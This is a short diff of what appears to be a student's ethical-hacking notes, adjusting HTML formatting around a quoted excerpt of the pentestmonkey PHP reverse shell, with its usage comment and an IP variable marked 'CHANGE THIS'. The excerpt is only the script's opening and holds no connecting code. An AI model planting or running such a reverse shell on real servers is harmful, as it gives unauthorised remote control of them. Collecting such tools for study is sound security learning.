@@ -61,7 +61,8 @@ while I am studing ethical hacking I will add usefull commands and scripts
     // Usage
     // -----
     // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
-    
+    </pre>
+    <pre>
     set_time_limit (0);
     $VERSION = "1.0";
     <b>$ip = '127.0.0.1';  // CHANGE THIS
